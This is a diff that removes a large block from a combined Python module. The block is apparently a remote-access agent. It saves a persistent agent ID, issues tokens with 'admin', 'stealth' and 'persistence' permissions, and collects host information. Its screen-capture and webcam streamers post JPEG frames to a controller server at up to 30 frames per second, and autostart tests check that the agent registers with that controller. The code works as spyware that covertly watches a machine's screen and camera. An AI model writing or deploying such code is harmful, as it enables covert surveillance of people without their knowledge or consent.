-        self.agent_id = self._generate_agent_id()
-        self.running = False
-        
-        # Enhanced components
-        self.stream_manager = None
-        self.security = None
-        
-        # Legacy support
-        self.streaming_enabled = False
-        self.camera_streaming_enabled = False
-        
-        # Initialize enhanced features
-        self._initialize_enhancements()
-        
-        enhanced_logger.info(f"Enhanced agent initialized with ID: {self.agent_id}")
-    
-    def _generate_agent_id(self) -> str:
-        """Generate unique agent ID"""
-        try:
-            # Try to read existing ID
-            id_file = os.path.join(os.path.expanduser("~"), ".agent_id")
-            if os.path.exists(id_file):
-                with open(id_file, 'r') as f:
-                    return f.read().strip()
-        except:
-            pass
-        
-        # Generate new ID
-        agent_id = str(uuid.uuid4())
-        
-        try:
-            # Save ID for persistence
-            id_file = os.path.join(os.path.expanduser("~"), ".agent_id")
-            with open(id_file, 'w') as f:
-                f.write(agent_id)
-        except:
-            pass
-        
-        return agent_id
-    
-    def _initialize_enhancements(self):
-        """Initialize enhanced features"""
-        try:
-            # Initialize streaming manager
-            self.stream_manager = StreamManager(self.server_url, self.agent_id)
-            enhanced_logger.info("Enhanced streaming manager initialized")
-            
-            # Initialize security features
-            self.security = SecurityEnhancements()
-            token = self.security.initialize_security(self.agent_id)
-            enhanced_logger.info(f"Security features initialized with token: {token[:20]}...")
-            
-        except Exception as e:
-            enhanced_logger.error(f"Error initializing enhancements: {e}")
-
-# ========================================================================================
-# From security_improvements.py - Security Improvements and Advanced Features
-# ========================================================================================
-
-class SecureAuth:
-    """Secure authentication system with token-based auth"""
-    
-    def __init__(self, secret_key: Optional[str] = None):
-        self.secret_key = secret_key or secrets.token_urlsafe(32)
-        self.active_tokens: Dict[str, Dict[str, Any]] = {}
-        self.max_token_age = 3600  # 1 hour
-        
-    def generate_token(self, agent_id: str, permissions: List[str] = None) -> str:
-        """Generate a secure authentication token"""
-        permissions = permissions or ["basic"]
-        
-        token_data = {
-            "agent_id": agent_id,
-            "permissions": permissions,
-            "created_at": time.time(),
-            "expires_at": time.time() + self.max_token_age,
-            "nonce": secrets.token_hex(16)
-        }
-        
-        # Create token signature
-        token_string = json.dumps(token_data, sort_keys=True)
-        signature = hmac.new(
-            self.secret_key.encode(),
-            token_string.encode(),
-            hashlib.sha256
-        ).hexdigest()
-        
-        token = base64.b64encode(f"{token_string}:{signature}".encode()).decode()
-        self.active_tokens[token] = token_data
-        
-        return token
-
-class SecurityEnhancements:
-    """Main security enhancements manager"""
-    
-    def __init__(self, password: str = "default_password"):
-        self.auth = SecureAuth()
-        self.password = password
-        
-    def initialize_security(self, agent_id: str) -> str:
-        """Initialize all security features"""
-        # Generate authentication token
-        token = self.auth.generate_token(agent_id, ["admin", "stealth", "persistence"])
-        return token
-    
-    def gather_intelligence(self) -> Dict[str, Any]:
-        """Gather comprehensive system intelligence"""
-        intelligence = {
-            "system_info": {
-                "hostname": socket.gethostname(),
-                "platform": platform.system(),
-                "architecture": platform.architecture(),
-                "processor": platform.processor()
-            },
-            "timestamp": time.time()
-        }
-        
-        return {
-            "data": intelligence,
-            "status": "success"
-        }
-    
-    def cleanup_and_exit(self):
-        """Clean up and exit safely"""
-        pass
-
-# ========================================================================================
-# From streaming_fixes.py - Streaming Fixes and Improvements
-# ========================================================================================
-
-class StreamingStats:
-    """Track streaming performance statistics"""
-    
-    def __init__(self):
-        self.frames_sent = 0
-        self.bytes_sent = 0
-        self.frames_dropped = 0
-        self.start_time = time.time()
-        self.last_fps_time = time.time()
-        self.fps = 0
-        
-    def update_frame(self, bytes_count: int):
-        """Update stats when a frame is sent"""
-        self.frames_sent += 1
-        self.bytes_sent += bytes_count
-        
-        # Calculate FPS every second
-        current_time = time.time()
-        if current_time - self.last_fps_time >= 1.0:
-            self.fps = self.frames_sent / (current_time - self.start_time)
-            self.last_fps_time = current_time
-    
-    def drop_frame(self):
-        """Record dropped frame"""
-        self.frames_dropped += 1
-    
-    def get_stats(self) -> Dict[str, Any]:
-        """Get current statistics"""
-        runtime = time.time() - self.start_time
-        return {
-            "runtime": runtime,
-            "frames_sent": self.frames_sent,
-            "frames_dropped": self.frames_dropped,
-            "bytes_sent": self.bytes_sent,
-            "fps": self.fps,
-            "avg_frame_size": self.bytes_sent / max(1, self.frames_sent),
-            "drop_rate": self.frames_dropped / max(1, self.frames_sent + self.frames_dropped)
-        }
-
-class ImprovedScreenStreamer:
-    """Improved screen streaming with better error handling and performance"""
-    
-    def __init__(self, server_url: str, agent_id: str, target_fps: int = 30):
-        self.server_url = server_url
-        self.agent_id = agent_id
-        self.target_fps = target_fps
-        self.frame_time = 1.0 / target_fps
-        self.running = False
-        self.thread: Optional[threading.Thread] = None
-        
-        # Performance tracking
-        self.stats = StreamingStats()
-        
-        # Connection settings
-        self.url = f"{server_url}/stream/{agent_id}"
-        self.headers = {'Content-Type': 'image/jpeg'}
-        self.timeout = 0.1
-        
-    def start(self):
-        """Start the streaming thread"""
-        if not self.running:
-            self.running = True
-            self.thread = threading.Thread(target=self._stream_loop, daemon=True)
-            self.thread.start()
-    
-    def stop(self):
-        """Stop the streaming thread"""
-        if self.running:
-            self.running = False
-            if self.thread:
-                self.thread.join(timeout=5)
-    
-    def _stream_loop(self):
-        """Main streaming loop with enhanced error handling"""
-        with mss.mss() as sct:
-            consecutive_errors = 0
-            max_consecutive_errors = 10
-            
-            while self.running and consecutive_errors < max_consecutive_errors:
-                try:
-                    frame_start = time.time()
-                    
-                    # Capture screen
-                    monitor = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
-                    sct_img = sct.grab(monitor)
-                    frame = np.array(sct_img)
-                    
-                    # Handle different color formats
-                    if frame.shape[2] == 4:  # BGRA
-                        frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2RGB)
-                    elif frame.shape[2] == 3:  # BGR
-                        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-                    
-                    # Resize large frames for better performance
-                    height, width = frame.shape[:2]
-                    if width > 1920:
-                        scale = 1920 / width
-                        new_width = int(width * scale)
-                        new_height = int(height * scale)
-                        frame = cv2.resize(frame, (new_width, new_height))
-                    
-                    # Convert RGB to BGR for OpenCV
-                    frame_bgr = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
-                    
-                    # Encode with quality
-                    success, buffer = cv2.imencode('.jpg', frame_bgr, [cv2.IMWRITE_JPEG_QUALITY, 85])
-                    
-                    if success:
-                        # Send frame
-                        response = requests.post(
-                            self.url, 
-                            data=buffer.tobytes(), 
-                            headers=self.headers, 
-                            timeout=self.timeout
-                        )
-                        
-                        if response.status_code == 200:
-                            consecutive_errors = 0
-                            self.stats.update_frame(len(buffer.tobytes()))
-                        else:
-                            consecutive_errors += 1
-                            self.stats.drop_frame()
-                    else:
-                        consecutive_errors += 1
-                        self.stats.drop_frame()
-                    
-                    # Maintain target FPS
-                    elapsed = time.time() - frame_start
-                    sleep_time = max(0, self.frame_time - elapsed)
-                    if sleep_time > 0:
-                        time.sleep(sleep_time)
-                    
-                except Exception as e:
-                    consecutive_errors += 1
-                    time.sleep(0.1)
-
-class ImprovedCameraStreamer:
-    """Improved camera streaming with better error handling"""
-    
-    def __init__(self, server_url: str, agent_id: str, camera_id: int = 0, target_fps: int = 30):
-        self.server_url = server_url
-        self.agent_id = agent_id
-        self.camera_id = camera_id
-        self.target_fps = target_fps
-        self.frame_time = 1.0 / target_fps
-        self.running = False
-        self.thread: Optional[threading.Thread] = None
-        
-        # Performance tracking
-        self.stats = StreamingStats()
-        
-        # Camera settings
-        self.cap: Optional[cv2.VideoCapture] = None
-        self.url = f"{server_url}/camera/{agent_id}"
-        self.headers = {'Content-Type': 'image/jpeg'}
-        self.timeout = 0.5
-    
-    def start(self):
-        """Start camera streaming"""
-        if not self.running:
-            if self._init_camera():
-                self.running = True
-                self.thread = threading.Thread(target=self._stream_loop, daemon=True)
-                self.thread.start()
-    
-    def stop(self):
-        """Stop camera streaming"""
-        if self.running:
-            self.running = False
-            if self.thread:
-                self.thread.join(timeout=5)
-            if self.cap:
-                self.cap.release()
-    
-    def _init_camera(self) -> bool:
-        """Initialize camera with proper settings"""
-        try:
-            self.cap = cv2.VideoCapture(self.camera_id)
-            if not self.cap or not self.cap.isOpened():
-                return False
-            
-            # Set camera properties
-            self.cap.set(cv2.CAP_PROP_FPS, self.target_fps)
-            self.cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
-            self.cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
-            self.cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
-            
-            # Test capture
-            ret, frame = self.cap.read()
-            if not ret or frame is None:
-                return False
-            
-            return True
-            
-        except Exception as e:
-            return False
-    
-    def _stream_loop(self):
-        """Main camera streaming loop"""
-        consecutive_errors = 0
-        max_consecutive_errors = 10
-        
-        while self.running and consecutive_errors < max_consecutive_errors:
-            try:
-                frame_start = time.time()
-                
-                # Capture frame
-                ret, frame = self.cap.read()
-                if not ret or frame is None:
-                    consecutive_errors += 1
-                    time.sleep(0.1)
-                    continue
-                
-                # Encode frame
-                success, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
-                
-                if success:
-                    # Send frame
-                    response = requests.post(
-                        self.url,
-                        data=buffer.tobytes(),
-                        headers=self.headers,
-                        timeout=self.timeout
-                    )
-                    
-                    if response.status_code == 200:
-                        consecutive_errors = 0
-                        self.stats.update_frame(len(buffer.tobytes()))
-                    else:
-                        consecutive_errors += 1
-                        self.stats.drop_frame()
-                else:
-                    consecutive_errors += 1
-                    self.stats.drop_frame()
-                
-                # Maintain target FPS
-                elapsed = time.time() - frame_start
-                sleep_time = max(0, self.frame_time - elapsed)
-                if sleep_time > 0:
-                    time.sleep(sleep_time)
-                
-            except Exception as e:
-                consecutive_errors += 1
-                time.sleep(0.1)
-
-class StreamManager:
-    """Manages multiple streams and provides status information"""
-    
-    def __init__(self, server_url: str, agent_id: str):
-        self.server_url = server_url
-        self.agent_id = agent_id
-        self.screen_streamer: Optional[ImprovedScreenStreamer] = None
-        self.camera_streamer: Optional[ImprovedCameraStreamer] = None
-    
-    def start_screen_stream(self, fps: int = 30):
-        """Start screen streaming"""
-        if self.screen_streamer is None or not self.screen_streamer.running:
-            self.screen_streamer = ImprovedScreenStreamer(
-                self.server_url, self.agent_id, fps
-            )
-            self.screen_streamer.start()
-            return True
-        return False
-    
-    def stop_screen_stream(self):
-        """Stop screen streaming"""
-        if self.screen_streamer and self.screen_streamer.running:
-            self.screen_streamer.stop()
-            return True
-        return False
-    
-    def start_camera_stream(self, fps: int = 30, camera_id: int = 0):
-        """Start camera streaming"""
-        if self.camera_streamer is None or not self.camera_streamer.running:
-            self.camera_streamer = ImprovedCameraStreamer(
-                self.server_url, self.agent_id, camera_id, fps
-            )
-            self.camera_streamer.start()
-            return True
-        return False
-    
-    def stop_camera_stream(self):
-        """Stop camera streaming"""
-        if self.camera_streamer and self.camera_streamer.running:
-            self.camera_streamer.stop()
-            return True
-        return False
-    
-    def stop_all_streams(self):
-        """Stop all active streams"""
-        self.stop_screen_stream()
-        self.stop_camera_stream()
-    
-    def get_status(self) -> Dict[str, Any]:
-        """Get streaming status and statistics"""
-        status = {
-            "screen_streaming": False,
-            "camera_streaming": False,
-            "screen_stats": None,
-            "camera_stats": None
-        }
-        
-        if self.screen_streamer and self.screen_streamer.running:
-            status["screen_streaming"] = True
-            status["screen_stats"] = self.screen_streamer.stats.get_stats()
-        
-        if self.camera_streamer and self.camera_streamer.running:
-            status["camera_streaming"] = True
-            status["camera_stats"] = self.camera_streamer.stats.get_stats()
-        
-        return status
-
-# ========================================================================================
-# From test_autostart.py - Test functionality for autostart
-# ========================================================================================
-
-def test_server_startup():
-    """Test that we can start the controller server"""
-    print("🔧 Testing server startup...")
-    
-    try:
-        # Start the controller in background
-        controller_process = subprocess.Popen([
-            sys.executable, 'controller.py'
-        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        
-        # Wait a moment for server to start
-        time.sleep(3)
-        
-        # Test server status endpoint
-        try:
-            response = requests.get('http://localhost:8080/status', timeout=5)
-            if response.status_code == 200:
-                print("✅ Controller server started successfully")
-                print(f"   Status: {response.json()}")
-                return controller_process
-            else:
-                print(f"❌ Server returned status code: {response.status_code}")
-                return None
-        except requests.exceptions.RequestException as e:
-            print(f"❌ Failed to connect to server: {e}")
-            return None
-            
-    except Exception as e:
-        print(f"❌ Failed to start controller: {e}")
-        return None
-
-def test_agent_autostart():
-    """Test the agent autostart functionality"""
-    print("\n🚀 Testing agent autostart...")
-    
-    try:
-        # Start the agent
-        agent_process = subprocess.Popen([
-            sys.executable, 'python_agent.py'
-        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        
-        print("   Agent process started, waiting for autostart connection...")
-        time.sleep(10)  # Give time for autostart to work
-        
-        # Check if agent registered with server
-        try:
-            response = requests.get('http://localhost:8080/status', timeout=5)
-            if response.status_code == 200:
-                data = response.json()
-                active_agents = data.get('active_agents', 0)
-                if active_agents > 0:
-                    print(f"✅ Agent autostart successful! {active_agents} agent(s) connected")
-                    return agent_process
-                else:
-                    print("⚠️  Agent started but no connections detected")
-                    return agent_process
-            else:
-                print(f"❌ Server status check failed: {response.status_code}")
-                return None
-        except requests.exceptions.RequestException as e:
-            print(f"❌ Failed to check server status: {e}")
-            return None
-            
-    except Exception as e:
-        print(f"❌ Failed to start agent: {e}")
-        return None
-
-def run_autostart_tests():
-    """Main test function for autostart functionality"""
-    print("=" * 60)
-    print("ENHANCED AGENT AUTOSTART TEST SUITE")
-    print("=" * 60)
-    
-    controller_process = None
-    agent_process = None
-    
-    try:
-        # Test 1: Start controller
-        controller_process = test_server_startup()
-        if not controller_process:
-            print("\n❌ Cannot continue tests without controller")
-            return False
-        
-        # Test 2: Test agent autostart
-        agent_process = test_agent_autostart()
-        if not agent_process:
-            print("\n❌ Agent autostart test failed")
-            return False
-        
-        print("\n" + "=" * 60)
-        print("✅ AUTOSTART TEST SUITE COMPLETED")
-        print("=" * 60)
-        
-        return True
-        
-    except KeyboardInterrupt:
-        print("\n⚠️  Test interrupted by user")
-        return False
-    except Exception as e:
-        print(f"\n❌ Test suite error: {e}")
-        return False
-    finally:
-        if controller_process:
-            controller_process.terminate()
-        if agent_process:
-            agent_process.terminate()
 
 # ========================================================================================
 # END OF COMBINED MODULES
